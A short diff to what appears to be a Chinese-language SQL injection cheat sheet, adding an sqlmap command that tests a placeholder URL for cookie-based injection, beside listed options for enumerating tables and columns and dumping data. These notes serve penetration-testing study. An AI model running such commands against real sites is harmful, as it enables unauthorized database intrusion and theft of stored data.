@@ -56,7 +56,7 @@ php+mysql手工注入
 > -u http://xxx.asp --data"id=114" --level 3
 >  post注入
 
-
+- python SQLmap.py -u "xxxx.com" --cookie "id=xx" --level 2 //判断url是否存在cookie注入
 - `--tables` 爆表
 - `-T 表名 --columns` 爆字段
 - `-T 表名 -C 字段名 -C" "` --dump
